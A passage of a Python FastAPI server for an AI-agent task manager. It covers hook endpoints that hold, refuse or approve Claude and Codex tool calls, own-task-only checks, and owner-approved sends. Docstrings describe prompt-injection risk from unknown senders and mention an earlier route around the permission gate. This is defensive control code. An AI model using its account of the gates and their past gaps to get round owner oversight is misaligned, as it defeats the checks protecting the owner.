    """Said and did, for the task page: the agent's own list and tool in hand (witness), the files
    it wrote with git's +/- per file (proof.review), and where the task came from - the two
    halves side by side so a disagreement is seen BEFORE the review, not after."""
    t = store.get_task(tid)
    if not t: raise HTTPException(404, 'task not found')
    from . import proof
    sess = hub_term.session_for(tid)
    wit = getattr(sess, 'witness', None)             # a demo replay has none
    work = wit.snapshot(sess.files(), sess.cwd, (sess.tail(1) or [''])[-1]) if wit else None
    rev = {}
    if diff:
        try: rev = proof.review(store, tid) or {}
        except Exception as e: logger.debug(f'work review for {tid}: {e}')
    by_path = {f.get('path'): f for f in (rev.get('files') or [])}
    files = [{**f, 'added': by_path.get(f['path'], {}).get('added'), 'removed': by_path.get(f['path'], {}).get('removed')} for f in (work or {}).get('files', [])]
    for p, f in by_path.items():                        # git saw it, the witness did not: still DID
        if p not in {x['path'] for x in files}: files.append({'path': p, 'n': 0, 'last': None, 'late': False, 'added': f.get('added'), 'removed': f.get('removed')})
    d = store.task_detail(tid); m0 = (d.get('messages') or [None])[0] or {}
    approved = next((r for r in d.get('reviews') or [] if r.get('Status') in ('approved', 'sent')), None)
    prov = {'from': ' · '.join(x for x in (m0.get('Channel'), m0.get('FromName') or m0.get('FromEmail')) if x) or t.get('Source') or '',
            'kind': t.get('Kind') or '', 'by': (sess.agent if sess else '') or t.get('RunAgent') or '',
            'approved': (approved or {}).get('UpdatedAt') or (approved or {}).get('CreatedAt'), 'status': t.get('Status')}
    return {'work': work, 'files': files, 'prov': prov, 'diffstat': {'added': rev.get('added'), 'removed': rev.get('removed')},
            'session': {'sid': sess.sid, 'alive': sess.alive, 'agent': sess.agent, 'cli': hub_term.cli_of(sess.argv), 'started': sess.started, 'cwd': sess.cwd} if sess else None}

@app.get('/api/tasks/{tid}/record')
def task_record(tid: int):
    """Everything each session did and thought, one shape for every CLI and the general agent (sessionrecord) -
    what the Agent work card draws: the result once, then what it decided, changed, planned and wrote, then every step."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    from . import sessionrecord
    return sessionrecord.record(store, tid)


@app.post('/api/hooks/claude/ask')
async def cli_hook_ask(payload: dict):
    """Claude's AskUserQuestion, BEFORE it draws its form (hooks.ask): recorded, and on the owner's own task let go at once
    so the form is asked in the terminal. A stranger's session is held here - a worker thread, up to hooks.ASK_WAIT -
    while the owner answers in the Assistant or on the phone, then the answers are this hook's reply. {} lets Claude
    draw its own form; so does anything that goes wrong - a hook must never trouble the agent.

    On the permits' own threads (_PERMIT_POOL), never anyio's shared forty: queued behind other sync routes the question
    was recorded nowhere while Claude sat on "running PreToolUse hook" until curl's 570 s ran out."""
    from . import hooks
    def go():
        try: return hooks.ask(payload if isinstance(payload, dict) else {})
        except Exception as e:
            logger.debug(f'ask hook ignored: {e}'); return {}
    return await asyncio.get_running_loop().run_in_executor(_PERMIT_POOL, go)


@app.post('/api/hooks/claude/reason')
def cli_hook_reason(payload: dict):
    """Before one of our sessions uses a Reason Network tool (hooks.reason): a message to someone the owner does not trust is
    refused, and ask_user is held here as the owner's approval card. {} - and any error - leaves the call to Claude and Reason."""
    from . import hooks
    try: return hooks.reason(payload if isinstance(payload, dict) else {})
    except Exception as e:
        logger.debug(f'reason network hook ignored: {e}'); return {}


@app.post('/api/hooks/claude/browser')
async def cli_hook_browser(payload: dict, sid: str = ''):
    """Before one of our sessions runs a shell command (hooks.browser -> browsergate.check): a browser act that can't be undone is
    refused and held on the task for the owner's press. On the permits' threads - a snapshot and a model verdict take seconds, and
    on anyio's shared forty they would queue behind every other sync route. A failure IN the judging holds (check); a failure
    around it - an unreadable payload - lets the command go, as every hook here does."""
    from . import hooks
    def go():
        try: return hooks.browser(payload if isinstance(payload, dict) else {}, sid=sid)       # sid: a general chat's own hook (hooks.browser_settings)
        except Exception as e:
            logger.warning(f'browser hook: {e}'); return {}
    return await asyncio.get_running_loop().run_in_executor(_PERMIT_POOL, go)


@app.post('/api/hooks/claude/floor')
def cli_hook_floor(payload: dict, task: int, request: Request):
    """A stranger's session asks, before every tool call, whether the floor allows it (floor.check). An error here is a
    non-2xx, and the hook's onFailure: block refuses the call - this door fails closed. Only the session's OWN task asks."""
    from . import floor, hooks, workerstate as ws
    _own_task_only(request, task)
    payload = payload if isinstance(payload, dict) else {}
    out = floor.check(payload, task, store)
    why = (out.get('hookSpecificOutput') or {}).get('permissionDecisionReason') if out else ''
    if why:
        # on the task, under Taskuary's own run (hooks.run_sid - Claude's id would be dropped as another run's): the refusal
        # is the owner's to see. A failed note must not turn the deny into an error the agent reads as something else.
        try: ws.record(store, task, hooks.run_sid(payload, task), 'floor_denied', text=f"{payload.get('tool_name') or 'a tool'}: {why}", source='floor')
        except Exception as e: logger.warning(f'floor denial on task {task} not recorded: {e}')
    return out


# A hook writes the store, and run on the loop it froze every pane, socket and screencast whenever another thread held
# the store's lock (P16, measured: p99 45-60 ms, max 2 s, and a hook past curl's 3 s was dropped). So it runs off the
# loop - on ONE worker, in arrival order, exactly as the loop used to serialise them: a PermissionRequest and the
# PostToolUse that closes it, a Stop and the next UserPromptSubmit, must never overtake each other the way a pool can.
from concurrent.futures import ThreadPoolExecutor
from functools import partial
_HOOK_WORKER = ThreadPoolExecutor(max_workers=1, thread_name_prefix='cli-hook')


# A permit can wait days for the owner, so it gets its OWN threads: on anyio's shared pool of 40, forty waiting strangers
# would starve every other sync route.
_PERMIT_POOL = ThreadPoolExecutor(max_workers=64, thread_name_prefix='permit')

def _close_permits():
    "Shutdown: every held permit is refused, and a fresh pool takes its place (one process may start the app again - tests do)."
    global _PERMIT_POOL
    from . import workerstate as ws
    ws.release_all()
    _PERMIT_POOL.shutdown(wait=False, cancel_futures=True)
    _PERMIT_POOL = ThreadPoolExecutor(max_workers=64, thread_name_prefix='permit')

@app.post('/api/hooks/claude/permit')
async def cli_hook_permit(payload: dict, task: int, request: Request):
    """Held on its own thread until the owner answers (hooks.permit). Only the session's OWN task asks. Any error is a
    non-2xx, which the hook's onFailure: block turns into a refusal - never an allow."""
    from . import hooks
    _own_task_only(request, task)
    return await asyncio.get_running_loop().run_in_executor(
        _PERMIT_POOL, partial(hooks.permit, payload if isinstance(payload, dict) else {}, task, store=store))

async def _hook_off_loop(f, *args, **kw):
    """Run f on the hook worker. Shielded: a curl that hangs up must not cancel a hook still queued - on the loop it ran
    once its body was read, whoever was still listening."""
    return await asyncio.shield(asyncio.wrap_future(_HOOK_WORKER.submit(partial(f, *args, **kw))))

@app.post('/api/hooks/{cli}')
async def cli_hook(cli: str, request: Request):
    """A CLI's hook fired in a checkout a session of ours works in (hooks.py wires it): the event's
    JSON comes in on the body, the path says which CLI is speaking (claude or codex - same event
    schema, bound to a session of that CLI). Always 200 and quiet - a hook must never trouble the agent."""
    from . import hooks
    if cli not in hooks.HOOKED: return {'bound': False}
    # Anything unreadable is a non-event, including a hook that HUNG UP: hooks.py posts with
    # `curl -s -m 3` so it can never hold the agent, and a server stalled for longer than that
    # outlives the curl - request.body() then raises ClientDisconnect, which is no ValueError and
    # used to escape as a 500 per stall. The agent moved on three seconds ago either way.
    try: payload = json.loads((await request.body()) or b'{}')
    except Exception as e:
        logger.debug(f'claude hook body unreadable: {e}'); return {'bound': False}
    try: return await _hook_off_loop(hooks.receive, payload if isinstance(payload, dict) else {}, cli=cli)
    except Exception as e:
        logger.debug(f'{cli} hook ignored: {e}'); return {'bound': False}

# ── the handbook (handbook.py): what the agents worked out, by topic, open to comment ──────
class HubPostBody(BaseModel):
    title: str; body: str = ''; topic: str = ''; kind: str = 'howto'; author: str | None = None
    why_earned: str | None = None
class HubCommentBody(BaseModel): body: str; author: str | None = None

def _hub_actor(request: Request, claimed: str | None = None) -> str:
    """The browser is the owner; an agent token may name its agent without spoofing the owner."""
    from . import guard
    if guard.scope_of(cfg['server'], request.headers) != guard.AGENT: return ACTOR
    raw = request.headers.get('X-Taskuary-Agent') or claimed or 'agent'
    return re.sub(r'[^a-zA-Z0-9_.-]+', '-', str(raw)).strip('-')[:60] or 'agent'

def _require_hub_write(request: Request):
    from . import guard, scopes
    if guard.scope_of(cfg['server'], request.headers) != guard.AGENT: return
    conn = store.get_connector_by_type('handbook')
    if not conn: return
    try: scopes.require(conn, 'hub_write')
    except PermissionError as e:
        store.audit('tool', conn['ConnectorId'], 'run_refused', _hub_actor(request),
                    detail={'type': 'hub_write', 'scope': scopes.scope_of(conn)})
        raise HTTPException(403, str(e))

@app.get('/api/hub')
@app.get('/api/handbook')
def hub_list(topic: str = None, q: str = None, kind: str = None, sort: str = 'new', limit: int = 60, status: str = 'live'):
    """The Hub tab. Topics down the side, high-signal posts in the middle,
    written by whichever agent worked it out, and correctable by whoever knows better.
    status=removed lists what the vote or the owner took off - readable, restorable."""
    posts = store.lore_posts(topic or None, q or None, max(1, min(limit, 200)), sort,
                             'live' if status == 'live' else 'removed', kind or None)
    # the owner's own vote rides on each row so the arrow can show which way they leaned
    for p in posts: p['MyVote'] = next((v['Delta'] for v in store.lore_votes(p['LoreId']) if v['Actor'] == ACTOR), 0)
    return {'topics': store.lore_topics(), 'data': posts, 'count': store.lore_count()}

@app.get('/api/hub/{lid}')
@app.get('/api/handbook/{lid}')
def hub_one(lid: int):
    p = store.lore_get(lid)
    if not p: raise HTTPException(404, 'no such entry')
    return {**p, 'comments': store.lore_comments(lid), 'votes': store.lore_votes(lid)}

@app.post('/api/hub')
@app.post('/api/handbook')
def hub_post(body: HubPostBody, request: Request):
    """File an entry. Gated the same way the hub_write tool is, because it is the same act
    through a different door - and this door was the way round the ladder.

    An entry is not a note: the Hub gives it to relevant future agents as company knowledge, so it is
    a claim handed to every future session as company fact. scopes.py classifies that as a WRITE
    for exactly that reason. Only AGENTS are measured against it - the owner writing on the Hub
    tab is the person the ladder exists to protect, not a caller to check."""
    from . import guard, handbook as hub
    if not hub.enabled(store):
        raise HTTPException(403, 'the Hub is off - turn its card on under Connections')
    _require_hub_write(request)
    if guard.scope_of(cfg['server'], request.headers) == guard.AGENT and len((body.why_earned or '').strip()) < 20:
        raise HTTPException(422, 'agent Hub posts need why_earned: the concrete investigation or reasoning that earned the post')
    try: return hub.post(store, body.title, body.body, body.topic, body.kind,
                         _hub_actor(request, body.author), why_earned=body.why_earned or '')
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/hub/{lid}/restore')
@app.post('/api/handbook/{lid}/restore')
def hub_restore(lid: int, request: Request):
    """Back on the Hub - a removed entry that turned out to be right after all."""
    if not store.lore_get(lid): raise HTTPException(404, 'no such entry')
    _require_hub_write(request)
    actor = _hub_actor(request)
    store.lore_restore(lid); store.audit('hub', lid, 'restore', actor)
    return dict(store.lore_get(lid))

@app.post('/api/hub/{lid}/comment')
@app.post('/api/handbook/{lid}/comment')
def hub_comment(lid: int, body: HubCommentBody, request: Request):
    """A comment is how a post gets corrected without being erased. An agent that finds an entry
    wrong says so here, and the next reader sees both."""
    if not store.lore_get(lid): raise HTTPException(404, 'no such entry')
    _require_hub_write(request)
    text = ' '.join((body.body or '').split())[:4000]
    if not text: raise HTTPException(422, 'say something')
    cid = store.lore_comment(lid, text, _hub_actor(request, body.author))
    return {'commentId': cid, 'comments': store.lore_comments(lid)}

@app.post('/api/hub/{lid}/vote')
@app.post('/api/handbook/{lid}/vote')
def hub_vote(lid: int, request: Request, up: bool = True, by: str = None):
    """Up or down, one vote per voter - forum rules. The score ranks what the Hub gives
    an agent, and an entry voted below zero is removed from the Hub (restorable). `by` names an
    agent voting through the API; the owner's own votes are ACTOR."""
    from . import handbook as hub
    _require_hub_write(request)
    try: return hub.vote(store, lid, 1 if up else -1, _hub_actor(request, by))
    except ValueError as e: raise HTTPException(404, str(e))

@app.post('/api/hub/{lid}/retire')
@app.post('/api/handbook/{lid}/retire')
def hub_retire(lid: int, request: Request):
    """No longer true. Retired, not deleted: a Hub that silently loses entries is one you
    cannot tell the difference between right and empty in."""
    if not store.lore_get(lid): raise HTTPException(404, 'no such entry')
    _require_hub_write(request)
    actor = _hub_actor(request)
    store.lore_retire(lid, actor)
    store.audit('hub', lid, 'retire', actor)
    return {'retired': True}

class OutboxBody(BaseModel):
    channel: str; to: str | list[str]; about: str; mode: str = 'draft'
    cc: list[str] = []
    subject: str | None = None; repo: str | None = None

@app.post('/api/outbox')
def outbox(body: OutboxBody):
    """＋ New → Send something. Start a message instead of answering one.

    Two modes, one ending. 'draft' has the AI write it now, in the owner's voice, and parks it in
    Review. 'task' sends an agent to find out first; when it finishes, the message is written
    from what it actually found and lands in the same place. Neither one sends: the approved
    review does, through the one door every outgoing message already goes through."""
    from . import outbox as ob
    try: return ob.compose(store, body.channel, body.to, body.about, body.mode, body.subject,
                           body.repo, ACTOR, cc=body.cc)
    except ValueError as e: raise HTTPException(422, str(e))
    except Exception as e: raise HTTPException(422, str(e)[:400])

@app.get('/api/mailboxes')
def mailboxes(task: int | None = None):
    """The mailboxes a new email can go FROM (outbound.mailboxes) - Email someone's From picker - and, for a task, the one
    it starts on: the mailbox the task's mail came in on (outbound.task_mailbox), else the first."""
    data = outbound.mailboxes(store)
    return {'data': data, 'default': (outbound.task_mailbox(store, task) if task else None) or (data[0]['address'] if data else None)}

class TaskEmailBody(BaseModel):
    to: str; about: str = ''; cc: list[str] = []; subject: str | None = None
    attach: list[dict] = []          # [{kind: 'artifact' | 'attachment', id}] - files already on the task
    channel: str = 'email'; mailbox: str | None = None; name: str = ''     # a chat: `to` is its id, `name` what to call it

@app.post('/api/tasks/{task_id}/emails')
def task_email(task_id: int, body: TaskEmailBody):
    """The task bar's Email someone: the AI writes it from the owner's words and the work, it waits in Close out (outbox.task_email)."""
    from . import outbox as ob, session_artifacts as sa
    files = []
    for f in body.attach or []:
        kind, fid = str(f.get('kind') or ''), int(f.get('id') or 0)
        row = store.get_task_artifact(fid) if kind == 'artifact' else store.get_attachment(fid) if kind == 'attachment' else None
        # only a file of THIS task: the ids come from the page, and another task's file is not this one's to send
        mine = row and (row.get('TaskId') == task_id if kind == 'artifact'
                        else any(a.get('AttachmentId') == fid for a in (store.task_detail(task_id) or {}).get('attachments') or []))
        path = (sa.confined(row.get('Path')) if kind == 'artifact' else _attachment_path(row.get('Path'))) if mine else None
        if not path: raise HTTPException(422, f'that file is not on this task any more ({kind} {fid})')
        files.append((row.get('Name') or path.name, path.read_bytes()))
    try: return ob.task_email(store, task_id, body.to, body.about, body.cc, body.subject, files, ACTOR,
                              channel=body.channel, mailbox=body.mailbox, name=body.name)
    except ValueError as e: raise HTTPException(422, str(e))
    except Exception as e: raise HTTPException(422, str(e)[:400])

class NoteBody(BaseModel): title: str; body: str = ''; when: str | None = None

@app.post('/api/notes')
def own_note(body: NoteBody):
    """A note to yourself: a reminder, an idea, a thing to come back to.

    Everything on the Timeline until now was something that HAPPENED to the owner - mail, a
    chat, a report, a repository. There was nowhere to put "chase the Payworth AP on Tuesday"
    except an agent that would go and do something about it, so it went in a notebook instead
    and the one screen the owner watches all day knew nothing about it. `when` is what the note
    is FOR, not when it was typed: the row sits in that day (ownwork.note)."""
    from . import ownwork
    try: return ownwork.note(store, body.title, body.body, body.when, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))

class ReleaseBody(BaseModel): agent: str | None = None; model: str | None = None

@app.post('/api/tasks/{task_id}/release')
def release_task(task_id: int, body: ReleaseBody, background: BackgroundTasks):
    """"Yes, this one is fine" - the owner letting a held task through to the agent.

    A first message from an address nobody here has ever written to does not get to start a
    session by itself (senders.known): an inbound message is a prompt, and an unvetted prompt
    that opens a terminal on this machine is the whole prompt-injection surface in one step. It
    is still triaged, still shown, still a task - it just waits for this click. Releasing drops
    the hold so the sender is never asked about again, and starts the session."""
    from .ingest import HOLD_TAG
    if not store.get_task(task_id): raise HTTPException(404, 'task not found')
    if not store.task_has_tag(task_id, HOLD_TAG): raise HTTPException(422, 'this task is not being held')
    store.tag_task(task_id, HOLD_TAG, on=False, actor=ACTOR)
    store.add_comment(task_id, ACTOR, 'human', 'Released to the agent - you vouched for this sender.')
    m = next((m for m in store.list_messages(task_id) if m.get('Channel') == 'email' and m.get('Direction') != 'out'), None)
    if m: store.remember_trust(m.get('SourceName'), m.get('FromEmail'), 'released by the owner')
    from . import senders
    senders.vouch(store, store.list_messages(task_id))
    store.audit('task', task_id, 'release', ACTOR)
    from . import general, ingest as _ing
    if general.handles(store.get_task(task_id)):
        _ing._spawn(_ing._auto_general, store, task_id)     # the assistant's session, not a CLI (PW-069)
        return {'released': True, 'assistant': True}
    ses = start_session(store, task_id, body.agent, body.model)
    return {'released': True, 'session': ses}

class AgentDoneBody(BaseModel): task_id: int; summary: str = ''; agent: str = 'agent'; no_reply: bool = False

def _own_task_only(request: Request, tid: int):
    """One agent token is shared by every session, so the allow list alone let any of them draft or
    close a NEIGHBOUR's task; the session's task proof (guard.owns_task) narrows it to its own."""
    if not guard.owns_task(cfg['server'], request.headers, tid):
        logger.warning(f'agent refused {request.method} {request.url.path} on task {tid} - not its own task')
        raise HTTPException(403, 'agents cannot do this: a session drafts and finishes its OWN task only. '
                                 'Run `taskuary --reply/--done` from the session that is working it.')

@app.post('/api/agent/done')
def agent_done(body: AgentDoneBody, request: Request):
    """`taskuary --done "..."` from inside an agent's own shell: the session says it has finished.

    This is the ending the Done button used to be the only door to - and the button is a person
    looking at a screen, which is exactly what an agent working at 2am does not have. Same wrap,
    same report, same drafted reply waiting on the owner's approval; only the thing that noticed
    the work was over has changed (selfclose.declare)."""
    from . import selfclose
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    return selfclose.declare(store, body.task_id, body.summary, body.agent, no_reply=body.no_reply)

def _owner_history(request: Request, tid: int):
    """A session reads the owner's history on its OWN task, and never on a stranger's: the middleware refuses a stranger's token
    (guard.stranger_denied), and a task a stranger wrote on is refused here whoever asks for it, as its brief never names the door."""
    from . import origin
    _own_task_only(request, tid)
    if not store.get_task(tid): raise HTTPException(404, 'no such task')
    if origin.of_task(store, tid)[0] == 'stranger':
        raise HTTPException(403, "a stranger's task does not read the owner's mail - work from what the task itself holds")

@app.get('/api/agent/messages')
def agent_messages(request: Request, task_id: int, sender: str = '', subject: str = '', words: str = '', since: str = '', until: str = '',
                   limit: int = 20):
    """`taskuary --search` from an agent's own shell: the owner's mail and messages by sender, subject, words and date (mailsearch)."""
    from . import mailsearch
    _owner_history(request, task_id)
    hits = mailsearch.search(store, sender, subject, words, since, until, limit)
    return {'data': hits, 'says': mailsearch.says(hits)}

@app.get('/api/agent/messages/{mid}')
def agent_message(mid: int, request: Request, task_id: int):
    """`taskuary --message ID`: one message in full, with its thread."""
    from . import mailsearch
    _owner_history(request, task_id)
    m = mailsearch.message(store, mid)
    if not m: raise HTTPException(404, 'no such message')
    return m

class AgentFile(BaseModel): name: str; data: str                  # data is base64: the CLI reads the file, the server never opens a path it is handed
class AgentReplyBody(BaseModel): task_id: int; text: str = ''; agent: str = 'agent'; files: list[AgentFile] = []; follow_up: bool = False

def _agent_files(files):
    import base64, binascii
    try: return [(f.name, base64.b64decode(f.data, validate=True)) for f in files]
    except (binascii.Error, ValueError): raise HTTPException(422, 'an attached file was not valid base64')

@app.post('/api/agent/reply')
def agent_reply(body: AgentReplyBody, request: Request):
    """`taskuary --reply "..."` from inside an agent's own shell: the agent that did the work writes the
    answer the sender gets, and it becomes the task's pending reply as written (wrapup.agent_reply).
    Nothing is sent - the owner approves it - and the end of the run keeps it instead of redrafting."""
    from . import wrapup
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    return wrapup.agent_reply(store, body.task_id, body.text, body.agent, files=_agent_files(body.files), follow_up=body.follow_up)

class AgentDraftBody(BaseModel): task_id: int; text: str; to: str = ''; subject: str = ''; slot: str = ''; agent: str = 'agent'; files: list[AgentFile] = []

@app.post('/api/agent/draft')
def agent_draft(body: AgentDraftBody, request: Request):
    """`taskuary --draft` from inside an agent's own shell: one of the emails that closes the task (slots.draft). Nothing is sent."""
    from . import slots
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    from . import wrapup
    files = _agent_files(body.files)
    out = slots.draft(store, body.task_id, body.text, body.to, body.subject, body.slot, body.agent)
    return {**out, **wrapup.attach_files(store, out['review_id'], files, body.agent)} if out.get('ok') and files else out

class AgentWaitBody(BaseModel): task_id: int; who: str; agent: str = 'agent'

@app.post('/api/agent/waiting')
def agent_waiting(body: AgentWaitBody, request: Request):
    """`taskuary --waiting-on "<who>"` from an agent's own shell: only that person can answer what it needs, so the task waits on
    them - and their reply wakes it (waiton.py). Nothing is sent: asking them is a --draft or --reply the owner approves."""
    from . import waiton
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    return waiton.declare(store, body.task_id, body.who, body.agent)

class AgentItemBody(BaseModel): task_id: int; item: int; result: str; overlap: str = ''; settled: bool = False; agent: str = 'agent'; propose: str = ''

@app.post('/api/agent/item')
def agent_item(body: AgentItemBody, request: Request):
    """`taskuary --item n --result ...` from a batch's own session: what it found on one item goes on that item's line (batch.report)."""
    from . import batch
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    if not batch.is_batch(store, body.task_id): raise HTTPException(422, 'this task is not a batch - report with --done or --reply')
    return batch.report(store, body.task_id, body.item, body.result, body.overlap, body.settled, body.agent, body.propose)

class AgentTickBody(BaseModel): task_id: int; item: str; done: bool = True; agent: str = 'agent'

@app.post('/api/agent/tick')
def agent_tick(body: AgentTickBody, request: Request):
    """`taskuary --tick <id>` / `--untick <id>` from the session working the task: it ticks the to-dos it finishes (the owner,
    2026-10-22). The box's state and nothing else - never its words, never a box on another task. An email box ticks when its email
    goes and a goal's step when its task closes, so neither is a session's to tick (store.agent_tickable)."""
    from .store import agent_tickable
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    hit = next((i for i in store.task_checklist(body.task_id) if i['id'] == body.item.strip()), None)
    if not hit: raise HTTPException(404, f'no to-do {body.item} on this task - the id is in brackets after it in your checklist')
    if not agent_tickable(hit): raise HTTPException(422, f"\"{hit['text']}\" ticks itself - when its email goes, or its task closes")
    store.tick_checklist_item(body.task_id, hit['id'], body.done, 'agent')
    return {'ok': True, 'item': hit['id'], 'text': hit['text'], 'done': bool(body.done)}

class AgentProposeBody(BaseModel):
    model_config = {'extra': 'allow'}
    task_id: int; action: str; why: str = ''

@app.post('/api/agent/propose')
def agent_propose(body: AgentProposeBody, request: Request):
    """An agent asks for one act only the owner's press runs (proposals.py) - a GitHub comment, a pull request, a send on a system -
    on its OWN task. The TASKUARY-PROPOSE mark in a transcript files the same review; this is the door a tool call takes (agenttools).
    A Jira or GitHub comment is a send (the owner, 2026-10-25), so it is always this road, never a direct call."""
    from . import agenttools, proposals
    _own_task_only(request, body.task_id)
    if not store.get_task(body.task_id): raise HTTPException(404, 'no such task')
    try: p = agenttools.proposal_of(body.model_dump())
    except ValueError as e: raise HTTPException(403, str(e))
    q = proposals.queue(store, body.task_id, p, 'agent')
    if not q: raise HTTPException(422, 'the proposal was refused - the reason is on the task')
    return {'ok': True, 'queued': True, 'review': q['reviewId'], 'says': "Waiting on the owner's press - nothing happens until they approve it."}

@app.post('/api/mcp')
async def mcp_rpc(request: Request, task: int = 0):
    """Taskuary's tools as an MCP server (agenttools) for the session on `task` - its agent token and task proof in the headers, which
    the middleware already read: a stranger's token never gets here (guard.stranger_denied), and every door below checks the task is
    the session's own. JSON-RPC answered as plain JSON; a notification gets 202. Reads of the owner's history refuse a stranger's task."""
    from . import agenttools
    try: msg = await request.json()
    except ValueError: return JSONResponse({'jsonrpc': '2.0', 'id': None, 'error': {'code': -32700, 'message': 'not JSON'}}, status_code=400)
    if not task or not store.get_task(task):
        return JSONResponse({'jsonrpc': '2.0', 'id': (msg or {}).get('id') if isinstance(msg, dict) else None,
                             'error': {'code': -32602, 'message': 'this server answers for one task: /api/mcp?task=<id>'}}, status_code=404)
    if not guard.owns_task(cfg['server'], request.headers, task):
        return JSONResponse({'jsonrpc': '2.0', 'id': (msg or {}).get('id') if isinstance(msg, dict) else None,
                             'error': {'code': -32001, 'message': 'agents cannot do this: a session uses the tools of its OWN task'}}, status_code=403)
    doors = {'tool_run': lambda b: tool_run(b, request),
             'tick': lambda tid, item, done: agent_tick(AgentTickBody(task_id=tid, item=item, done=done), request),
             'reply': lambda tid, text: agent_reply(AgentReplyBody(task_id=tid, text=text), request),
             'draft': lambda tid, text, to, subject: agent_draft(AgentDraftBody(task_id=tid, text=text, to=to, subject=subject), request),
             'propose': lambda tid, a: agent_propose(AgentProposeBody(**{**a, 'task_id': tid}), request)}
    def run(name, args):
        cls = agenttools.TOOLS[name][0]
        if cls == 'read' and name not in ('my_task', 'list_systems', 'run_system'): _owner_history(request, task)
        out = agenttools.call(store, task, name, args, doors)
        return out.body.decode() if isinstance(out, JSONResponse) else out
    def one(m): return agenttools.rpc(m, run) if isinstance(m, dict) else {'jsonrpc': '2.0', 'id': None, 'error': {'code': -32600, 'message': 'not a request'}}
    out = await run_in_threadpool(lambda: [r for r in map(one, msg if isinstance(msg, list) else [msg]) if r is not None])   # the doors are sync
    if not out: return Response(status_code=202)
    return JSONResponse(out if isinstance(msg, list) else out[0])

@app.get('/api/mcp')
def mcp_stream():
    "No server-sent stream here: every answer comes back on its own POST (the spec lets a server say so with 405)."
    return Response(status_code=405, headers={'Allow': 'POST'})

class BatchActBody(BaseModel): action: str

@app.post('/api/tasks/{tid}/batch/{idx}')
def batch_act(tid: int, idx: int, body: BatchActBody):
    """The owner's press on one item of a batch: merge, close, settle or reopen it (batch.act)."""
    from . import batch
    if not store.get_task(tid): raise HTTPException(404, 'no such task')
    if not batch.is_batch(store, tid): raise HTTPException(422, 'this task is not a batch')
    out = batch.act(store, tid, idx, body.action)
    if out.get('setup'): return out              # not a failure: the repository is not set up for cloud fixes yet - the page offers Set up
    if not out.get('ok'): raise HTTPException(422, out.get('why') or 'not done')
    return out

@app.post('/api/tasks/{tid}/batch-combine')
def batch_combine(tid: int):
    """Every other open batch of this one's input folded into it, so one agent goes through them all (batch.combine)."""
    from . import batch
    out = batch.combine(store, tid, ACTOR)
    if not out.get('ok'): raise HTTPException(422, out.get('why') or 'not combined')
    return out

class CloudFixBody(BaseModel): repo: str

@app.get('/api/cloudfix')
def cloudfix_state(repo: str):
    """Is this repository ready to fix outside pull requests in GitHub's cloud: the workflow, and the secret (cloudfix.py)."""
    from . import cloudfix
    return cloudfix.setup_state(store, repo)

@app.post('/api/cloudfix/setup')
def cloudfix_setup(body: CloudFixBody):
    """The owner's press: commit the cloud-fix workflow to the repository's default branch."""
    from . import cloudfix
    try: out = cloudfix.install(store, body.repo, ACTOR)
    except Exception as e: raise HTTPException(422, str(e)[:300])
    return {**out, **cloudfix.setup_state(store, body.repo)}

@app.get('/api/tasks/{tid}/diff')
def task_diff(tid: int, scope: str = 'task'):
    """What THIS task's agent changed in its checkout, per file (scope=checkout: everything a
    push would carry, whoever wrote it). Read-only by construction: `git diff`, `git status`,
    `git log` - never `add`, never `stash`."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    from . import proof
    return proof.review(store, tid, scope if scope in ('checkout', 'pr') else 'task')

@app.post('/api/tasks/{tid}/land')
def task_land(tid: int, flow: str = None):
    """Publish this task's work the way Settings says: a DRAFT pull request, or the commits
    pushed straight onto the default branch. `flow` overrides for this one task. Never
    merges, never force-pushes, and refuses unless 'Agents may push / deploy' is on."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    from . import ci
    try:
        if flow == 'direct': return ci.push_direct(store, tid, ACTOR)
        if flow == 'pr': return ci.open_for_task(store, tid, ACTOR)
        return ci.land(store, tid, ACTOR)
    except Exception as e:
        raise HTTPException(422, str(e)[:300])

@app.post('/api/tasks/{tid}/ci')
def task_ci(tid: int):
    """Check this task's PR now: refresh the checks and, when red, hand the failure to the
    agent that wrote the code."""
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    from . import ci
    return ci.check_task(store, tid)

class ClarifyBody(BaseModel):
    body: str
    message_id: int | None = None

@app.post('/api/tasks/{tid}/clarify')
def clarify_with_sender(tid: int, body: ClarifyBody):
    """Prepare, but never send, the question an agent needs answered.

    This is deliberately its own review kind instead of reusing open_reply(): a task can have
    an action proposal or a final-answer draft already parked on the task, and a clarification
    must not overwrite either. Approval sends the question through the normal human gate while
    stopping the blocked terminal and leaving the coding task waiting for the answer.
    """
    t = store.get_task(tid)
    if not t: raise HTTPException(404, 'task not found')
    text = (body.body or '').strip()
    if not text: raise HTTPException(422, 'write the question to ask')
    messages = store.list_messages(tid)
    if body.message_id:
        m = store.get_message(body.message_id)
        if not m or m.get('TaskId') != tid: raise HTTPException(404, 'that message is not on this task')
    else:
        m = next((x for x in reversed(messages)
                  if x.get('Status') != 'context' and x.get('Direction') != 'out'), None)
    if not m: raise HTTPException(422, 'this task has no incoming message to answer')
    rv = store.pending_review(tid, 'clarification')
    if rv:
        rid = rv['ReviewId']
        store.save_review_draft(rid, text)
    else:
        rid = store.add_review({'TaskId': tid, 'MessageId': m['MessageId'], 'Kind': 'clarification',
                                'Status': 'pending', 'DraftText': text,
                                'Reason': 'the agent needs missing information from the sender'})
    store.add_comment(tid, ACTOR, 'human', 'Clarification drafted for the sender; waiting for your approval on the task.')
    store.audit('review', rid, 'clarification_drafted', ACTOR, detail={'message_id': m['MessageId']})
    return {'reviewId': rid, 'taskId': tid, 'draft': text}

@app.post('/api/tasks/{tid}/answer')
def answer_to_agent(tid: int, body: dict):
    """Type an attached message's text into the task's live agent session - the person
    answered the very question the agent is waiting on. The 'ask' mode's one click."""
